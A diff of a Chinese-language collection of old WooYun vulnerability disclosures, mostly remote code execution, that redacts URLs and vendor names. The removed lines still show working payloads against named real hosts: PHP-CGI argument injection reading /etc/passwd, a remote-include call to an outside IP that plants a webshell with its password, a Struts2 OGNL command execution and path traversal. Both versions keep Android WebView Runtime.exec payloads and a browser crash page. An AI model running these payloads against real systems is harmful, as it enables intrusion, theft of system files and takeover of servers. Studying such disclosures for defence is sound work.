-**详情**: 实易智能DNS管理系统，php CGI远程代码执行http://gznss.capital-online.com.cn案例：有一百多个http://gznss.capital-online.com.cn/index.php?-dauto_prepend_file%3d/etc/passwd+-nhttp://202.205.109.105/index.php?-dauto_prepend_file%3d/etc/passwd+-nhttp://118.194.166.172/index.php?-dauto_prepend_file%3d/etc/passwd+-nhttp://118.194.166.175/index.php?-dauto_prepend_file%3d/etc/passwd+-nhttp://211.150.124.83/index.php?-dauto_prepen
+**详情**: 实易智能DNS管理系统，php CGI远程代码执行https://example.com/[已脱敏]
 
-**POC**: 本地包含直接执行代码：远程包含执行代码：http://gznss.capital-online.com.cn/index.php?-dallow_url_include%3don+-dauto_prepend_file%3dhttp://219.145.166.89:90/myname/1.php菜刀地址同上，密码pass
+**POC**: 本地包含直接执行代码：远程包含执行代码：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -3573,8 +3573,8 @@
 ---
 
 ---
-### [wooyun-2012-07437] 腾讯点开QQ消息 执行本地文件、命令
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 远程代码执行
+### [wooyun-2012-07437] 某互联网公司点开某互联网公司消息 执行本地文件、命令
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 远程代码执行
 
 **元思考**: 触发信号: 功能测试
 
@@ -3587,11 +3587,11 @@
 
 **详情**: 发送指定网址，可自己构造，加密对方打开 即可执行恶意命令等
 
-**POC**: 对方点击这个地址： www.baidu.com..\..\就会跳转到 本地QQ 的安装目录：C:\Program Files\Tencent\QQ\Bin自己构造如：www.baidu.com..\..\qq.exe及可运行QQ.更多代码自由构造，可以执行cmd了
+**POC**: 对方点击这个地址： www.baidu.com..\..\就会跳转到 本地某互联网公司 的安装目录：C:\Program Files\Tencent\某互联网公司\Bin自己构造如：www.baidu.com..\..\某互联网公司.exe及可运行某互联网公司.更多代码自由构造，可以执行cmd了
 
 **绕过**: 直接利用
 
-**修复**: 赶快更新QQ 2013吧拭目以待啊
+**修复**: 赶快更新某互联网公司 2013吧拭目以待啊
 ---
 
 ---
@@ -3684,7 +3684,7 @@
 
 ---
 ### [wooyun-2012-09540] 某都联通宽带邮箱系统远程执行
-**厂商**: 中国联通 | **年份**: 2012 | **类型**: 远程代码执行
+**厂商**: 某运营商 | **年份**: 2012 | **类型**: 远程代码执行
 
 **元思考**: 触发信号: 功能测试
 
@@ -3739,7 +3739,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 下载懦豹4G浏览器：http://4g.roboo.com/下载dex2jar和jd-gui
+**详情**: 下载懦豹4G浏览器：https://example.com/[已脱敏]
 
 **POC**: 搜索addJavascriptInterfaceNavigator接口漏洞构造一个写文件+弹窗的Exp：<html><head><title>test</title></head><body><script>function execute(testcmd){return Navigator.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(testcmd);}try{execute(["/system/bin/sh","-c","echo 'Webview远程
 
@@ -3783,13 +3783,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 前几天同学帮抢了一个华为荣耀3c联通版手机，无意中测试了一下前段时间爆出的webView控件的远程代码执行漏洞，居然存在啊。关于该漏洞的详细信息参见http://drops.wooyun.org/papers/548。
+**详情**: 前几天同学帮抢了一个华为荣耀3c联通版手机，无意中测试了一下前段时间爆出的webView控件的远程代码执行漏洞，居然存在啊。关于该漏洞的详细信息参见https://example.com/[已脱敏]
 
-**POC**: 漏洞验证用的是乌云给出的关于这个漏洞的验证网页，地址为http://drops.wooyun.org/webview.html，用华为荣耀3c联通版的默认浏览器访问的结果如图1，说明存在漏洞。另外手机已经升级到最新，如图2。
+**POC**: 漏洞验证用的是乌云给出的关于这个漏洞的验证网页，地址为https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
-**修复**: 建议参见http://drops.wooyun.org/papers/548。
+**修复**: 建议参见https://example.com/[已脱敏]
 ---
 
 ---
@@ -3805,13 +3805,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 浏览器来说这种问题还是需要修补的导出了dolphinRSSChecker其中导出searchBoxJavaBridge_好像是跟google的搜索框相关的。在android 4.0手机上测试实际存在，4.2以上版本不存在function execute(cmdArgs){return searchBoxJavaBridge_.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}测试页面:http://drops.wooyun.org/webview.html参见:http://drops.wooyun.org/papers/548
+**详情**: 浏览器来说这种问题还是需要修补的导出了dolphinRSSChecker其中导出searchBoxJavaBridge_好像是跟google的搜索框相关的。在android 4.0手机上测试实际存在，4.2以上版本不存在function execute(cmdArgs){return searchBoxJavaBridge_.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}测试页面:https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: http://drops.wooyun.org/papers/548需要把这个接口删除，调用removeJavascriptInterface方法
+**修复**: https://example.com/[已脱敏]
 ---
 
 ---
@@ -3829,7 +3829,7 @@
 
 **详情**: 快播标准版（快播5.0）对avi格式处理存在一处堆溢出，可造成远程代码执行漏洞。如果avi格式的strf结构的datalen长度过大，会导致堆溢出。
 
-**POC**: POC地址：http://wydrops-wordpress.stor.sinaapp.com/uploads/2014/01/poc.zip
+**POC**: POC地址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -3849,7 +3849,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 今日头条安卓客户端远程代码执行，版本：3.4.3今日头条是一个用户量过亿的资讯类客户端。存在漏洞的接口：TTAndroidObject检测方法：直接在地址栏输入检测网址（http://drops.wooyun.org/webview.html）
+**详情**: 今日头条安卓客户端远程代码执行，版本：3.4.3今日头条是一个用户量过亿的资讯类客户端。存在漏洞的接口：TTAndroidObject检测方法：直接在地址栏输入检测网址（https://example.com/[已脱敏]
 
 **POC**: 安全宝和乌云提供漏洞检测服务
 
@@ -3871,7 +3871,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 欧朋手机浏览器 10.0.0.81463测试手机为安卓4.4.2
+**详情**: 欧朋手机浏览器 [IP已脱敏]63测试手机为安卓4.4.2
 
 **POC**: payload：<script>var k=1;window.onblur=s();document.getElementById("xxx").submit();function s(){if(k>1){window.open("javascript:document.write(3)","lll");}k++;}function s2(){window.open("javascript:document.write(3)","lll");window.onblur=function(){};}</script><body><form id="xxx" action="https://www
 
@@ -3881,8 +3881,8 @@
 ---
 
 ---
-### [wooyun-2015-0108355] 百度浏览器Android远程dos攻击
-**厂商**: 百度 | **年份**: 2015 | **类型**: 远程代码执行
+### [wooyun-2015-0108355] 某搜索引擎浏览器Android远程dos攻击
+**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: 远程代码执行
 
 **元思考**: 触发信号: 功能测试
 
@@ -3893,9 +3893,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 加载下面的远程网页，本来想进一步利用，但是一打开之后百度浏览器就跪了，就当是远程拒绝服务攻击吧。
+**详情**: 加载下面的远程网页，本来想进一步利用，但是一打开之后某搜索引擎浏览器就跪了，就当是远程拒绝服务攻击吧。
 
-**POC**: 在百度浏览器里加载下面的网页，即可使其远程拒绝服务poc:<html><title>test baidu browser</title><body><script>function readfile(id) {alert(document.getElementById(id).contentDocument.body.firstChild.innerHTML);}</script>load 1...<iframe id='iframe1' src='content://com.letv.datastatistics.db.StatisContentProvider.baidubrowser/'
+**POC**: 在某搜索引擎浏览器里加载下面的网页，即可使其远程拒绝服务poc:<html><title>test baidu browser</title><body><script>function readfile(id) {alert(document.getElementById(id).contentDocument.body.firstChild.innerHTML);}</script>load 1...<iframe id='iframe1' src='content://com.letv.datastatistics.db.StatisContentProvider.baidubrowser/'
 
 **绕过**: 直接利用
 
@@ -3937,7 +3937,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: DLL: MxWebkit.dll (ver 1.1.4.258)构造如下html文件:<html><math xmlns="http://www.w3.org/1998/Math/MathML"><input></input></math></html>使用傲游打开该html文件,将导致sub_2433900函数的调用.sub_2433900{loc_24339C0:push    ebxlea     eax, [esp+34h+var_10]push    eaxlea     ecx, [esp+38h+var_24]call    sub_240EA70;获取一个结构指针,存入var_10+4处.该结构大小为0x38字节...02433B06:mov     ecx, [esp+30h+var_20]call    sub_1FD49A0;访问前面获取的指针mov     ecx
+**详情**: DLL: MxWebkit.dll (ver [IP已脱敏])构造如下html文件:<html><math xmlns="https://example.com/[已脱敏]"><input></input></math></html>使用傲游打开该html文件,将导致sub_2433900函数的调用.sub_2433900{loc_24339C0:push    ebxlea     eax, [esp+34h+var_10]push    eaxlea     ecx, [esp+38h+var_24]call    sub_240EA70;获取一个结构指针,存入var_10+4处.该结构大小为0x38字节...02433B06:mov     ecx, [esp+30h+var_20]call    sub_1FD49A0;访问前面获取的指针mov     ecx
 
 **POC**: MxWebkit!CreateCookieObj+0x29a5a6:668049a6 8b01            mov     eax,dword ptr [ecx]  ds:0023:feeefeee=????????3:020> uMxWebkit!CreateCookieObj+0x29a5a6:668049a6 8b01            mov     eax,dword ptr [ecx]668049a8 8b5024          mov     edx,dword ptr [eax+24h]668049ab ffe2            jmp     edx
 
@@ -4035,8 +4035,8 @@
 ---
 
 ---
-### [wooyun-2014-079200] 中国移动手机营业厅官方android客户端存在另一枚webview远程代码执行漏洞
-**厂商**: 中国移动 | **年份**: 2014 | **类型**: 远程代码执行
+### [wooyun-2014-079200] 某运营商手机营业厅官方android客户端存在另一枚webview远程代码执行漏洞
+**厂商**: 某运营商 | **年份**: 2014 | **类型**: 远程代码执行
 
 **元思考**: 触发信号: 功能测试
 
@@ -4047,13 +4047,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 中国移动手机营业厅官方android客户端“服务渠道指南”页面存在webview远程代码执行漏洞。 黑客可以通过这个接口执行任意恶意代码，给用户造成财产损失。
+**详情**: 某运营商手机营业厅官方android客户端“服务渠道指南”页面存在webview远程代码执行漏洞。 黑客可以通过这个接口执行任意恶意代码，给用户造成财产损失。
 
 **POC**: 中间人劫持“常见问题”页面，替换为webview漏洞检测页面：http://drops/wooyun.org/webview.html出现下图接口：sdkInterface
 
 **绕过**: 直接利用
 
-**修复**: 可以参考：http://blog.csdn.net/leehong2005/article/details/11808557
+**修复**: 可以参考：https://example.com/[已脱敏]
 ---
 
 ---
@@ -4091,13 +4091,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 浏览器来说这种问题还是需要修补的导出searchBoxJavaBridge_好像是跟google的搜索框相关的。在android 4.0手机上测试实际存在，4.2以上版本不存在function execute(cmdArgs){return searchBoxJavaBridge_.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}测试页面:http://drops.wooyun.org/webview.html参见:http://drops.wooyun.org/papers/548
+**详情**: 浏览器来说这种问题还是需要修补的导出searchBoxJavaBridge_好像是跟google的搜索框相关的。在android 4.0手机上测试实际存在，4.2以上版本不存在function execute(cmdArgs){return searchBoxJavaBridge_.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}测试页面:https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 需要把这个接口删除，调用removeJavascriptInterface方法http://blog.csdn.net/leehong2005/article/details/11808557
+**修复**: 需要把这个接口删除，调用removeJavascriptInterface方法https://example.com/[已脱敏]
 ---
 
 ---
@@ -4123,8 +4123,8 @@
 ---
 
 ---
-### [wooyun-2014-050971] 支付宝钱包远程代码执行漏洞（需要一些步骤）
-**厂商**: 支付宝 | **年份**: 2014 | **类型**: 远程代码执行
+### [wooyun-2014-050971] 某电商平台钱包远程代码执行漏洞（需要一些步骤）
+**厂商**: 某电商平台 | **年份**: 2014 | **类型**: 远程代码执行
 
 **元思考**: 触发信号: 功能测试
 
@@ -4135,7 +4135,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 支付宝钱包远程代码执行漏洞，不过得点三个链接后才起作用，作为支付类app存在这种问题，还是不应该哦function execute(cmdArgs){return searchBoxJavaBridge_.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}导出searchBoxJavaBridge_，是跟google的搜索框相关的。在android 4.2以上版本不存在。测试页面:http://drops.wooyun.org/webview.html不懂看这里http://drops.wooyun.org/papers/548
+**详情**: 某电商平台钱包远程代码执行漏洞，不过得点三个链接后才起作用，作为支付类app存在这种问题，还是不应该哦function execute(cmdArgs){return searchBoxJavaBridge_.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}导出searchBoxJavaBridge_，是跟google的搜索框相关的。在android 4.2以上版本不存在。测试页面:https://example.com/[已脱敏]
 
 **POC**: WebActivity没导出，但是外部链接没控制好，需要几步到恶意页面点余额宝的公众帐号进去后点88.taobao.com点击进入88.taobao.com后的页面的底下的官方博客，进入博客看到列表点击一条博文进去，里面点个评论，（评论可以自己去填一个url)，完了评论弄个乌云检测webview的url再点击下
 
@@ -4179,7 +4179,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 网络实例http://www.csmap.gov.cn/iportal/iportalIndex.actionhttp://www.mapjs.com.cn/indexopen.actionhttp://zbgtj.gov.cn/iportal/iportalIndex.actionhttp://www.shanghai-map.net:8080/shmap/randimg2.actionhttp://www.xzmap.gov.cn/indexopen.action....很多   上百了搜索特征baidu：天地图baidu：inurl：indexopen.action爬行目录assist    maintain   previewhttp报文主动巡检<div class="sub_nav_bg"><span class="sub_nav_icon sub_nav_font">&nbsp
+**详情**: 网络实例https://example.com/[已脱敏]   上百了搜索特征baidu：天地图baidu：inurl：indexopen.action爬行目录assist    maintain   previewhttp报文主动巡检<div class="sub_nav_bg"><span class="sub_nav_icon sub_nav_font">&nbsp
 
 **POC**: (见原文)
 
@@ -4233,8 +4233,8 @@
 ---
 
 ---
-### [wooyun-2015-0160352] 中国电信某省守护天使系统java反序列化漏洞root权限
-**厂商**: 中国电信 | **年份**: 2015 | **类型**: 成功的入侵事件
+### [wooyun-2015-0160352] 某运营商某省守护天使系统java反序列化漏洞root权限
+**厂商**: 某运营商 | **年份**: 2015 | **类型**: 成功的入侵事件
 
 **元思考**: 触发信号: 功能测试
 
@@ -4267,13 +4267,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 浏览器来说这种问题还是需要修补的导出searchBoxJavaBridge_好像是跟google的搜索框相关的。在android 4.0手机上测试实际存在，4.2以上版本不存在function execute(cmdArgs){return searchBoxJavaBridge_.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}测试页面:http://drops.wooyun.org/webview.html参见:http://drops.wooyun.org/papers/548
+**详情**: 浏览器来说这种问题还是需要修补的导出searchBoxJavaBridge_好像是跟google的搜索框相关的。在android 4.0手机上测试实际存在，4.2以上版本不存在function execute(cmdArgs){return searchBoxJavaBridge_.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}测试页面:https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 需要把这个接口删除，调用removeJavascriptInterface方法http://blog.csdn.net/leehong2005/article/details/11808557
+**修复**: 需要把这个接口删除，调用removeJavascriptInterface方法https://example.com/[已脱敏]
 ---
 
 ---
@@ -4289,7 +4289,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: https://113.29.38.71/用工具一测试就知道了
+**详情**: https://[IP已脱敏]
 
 **POC**: 就是这么简单
 
@@ -4335,7 +4335,7 @@
 
 **详情**: 我有神器,你耐我何！-.-小菜罢了！
 
-**POC**: http://www.cntour2.com/1.txt
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -4377,7 +4377,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 存在远程代码执行漏洞的网站：http://oa.minanins.comurl:  http://oa.minanins.com/maechannel/manage/bcJinPengProposalRelation/list.do?tc=29data:   jinPengCarNo=1&mobile=987-65-4329&personName=ipebyqfg&proposalType=../../../../../../WEB-INF/config.xml?参数: proposalType通过知道proposalType的值可以远程执行命令的话，我在这里的话，就简单的测试证明漏洞的存在。其实，在tomcat里面，我们主要知道目录的存在的话，基本上把所有的配置都可以读出来。再证明一下：像服务器的配置文件我这里就不过多的陈述，其实都可以读出来配置的。这个网站还有一些跨站，你们自己去检测吧
+**详情**: 存在远程代码执行漏洞的网站：https://example.com/[已脱敏]  https://example.com/[已脱敏]   jinPengCarNo=1&mobile=987-65-4329&personName=ipebyqfg&proposalType=../../../../../../WEB-INF/config.xml?参数: proposalType通过知道proposalType的值可以远程执行命令的话，我在这里的话，就简单的测试证明漏洞的存在。其实，在tomcat里面，我们主要知道目录的存在的话，基本上把所有的配置都可以读出来。再证明一下：像服务器的配置文件我这里就不过多的陈述，其实都可以读出来配置的。这个网站还有一些跨站，你们自己去检测吧
 
 **POC**: 同上
 
@@ -4475,8 +4475,8 @@
 ---
 
 ---
-### [wooyun-2015-0104388] QQ浏览器扫描二维码代码执行
-**厂商**: 腾讯 | **年份**: 2015 | **类型**: 远程代码执行
+### [wooyun-2015-0104388] 某互联网公司浏览器扫描二维码代码执行
+**厂商**: 某互联网公司 | **年份**: 2015 | **类型**: 远程代码执行
 
 **元思考**: 触发信号: 功能测试
 
@@ -4487,9 +4487,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 用QQ浏览器扫描此二维码，自动跳转到百度成功跳转
+**详情**: 用某互联网公司浏览器扫描此二维码，自动跳转到某搜索引擎成功跳转
 
-**POC**: 用QQ浏览器扫描此二维码，自动跳转到百度成功跳转
+**POC**: 用某互联网公司浏览器扫描此二维码，自动跳转到某搜索引擎成功跳转
 
 **绕过**: 直接利用
 
@@ -4533,7 +4533,7 @@
 
 **详情**: 中国航空集团公司某站任意代码执行
 
-**POC**: 国航某功能使用了ST2:http://www.airchinagroup.com/ConsultAndSuggest/csManageAction!getInfoById.action?redirect:${new%20java.io.BufferedReader(new%20java.io.InputStreamReader(new%20java.lang.ProcessBuilder({%27uname%27,'-an'}).start().getInputStream())).readLine()}任意代码执行：
+**POC**: 国航某功能使用了ST2:https://example.com/[已脱敏]'-an'}).start().getInputStream())).readLine()}任意代码执行：
 
 **绕过**: 直接利用
 
@@ -4553,7 +4553,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.gfan.com//plus/imageurl.php?p=http://www.apx88.com/webadminhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/pic_seckill/info.php%3f%2500.jpgq参数未过滤，
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -4607,8 +4607,8 @@
 ---
 
 ---
-### [wooyun-2014-085724] 中国电信某平台补丁不及时致任意代码执行
-**厂商**: 中国电信 | **年份**: 2014 | **类型**: 系统/服务补丁不及时
+### [wooyun-2014-085724] 某运营商某平台补丁不及时致任意代码执行
+**厂商**: 某运营商 | **年份**: 2014 | **类型**: 系统/服务补丁不及时
 
 **元思考**: 触发信号: 功能测试
 
@@ -4619,7 +4619,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 地址：http://218.30.99.121/biz/login.action中国电信综治对讲平台
+**详情**: 地址：http://[IP已脱敏]
 
 **POC**: struts漏洞存在，未打补丁，无防火墙拦截电信平台，不再继续深入，尽快修复
 
@@ -4643,7 +4643,7 @@
 
 **详情**: 中国民航分站远程代码执行漏洞俺胆小，没有进一步测试还是发图吧
 
-**POC**: http://safety.caac.gov.cn:80/adminhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/common_downloadFile.do?localfilename=%D0%CD%BA%C5%C8%CF%BF%C9%D6%A4(VTC).pdf&destfilename=../../../../../../../../etc/passwd
+**POC**: https://example.com/[已脱敏]).pdf&destfilename=../../../../../../../../etc/passwd
 
 **绕过**: 直接利用
 
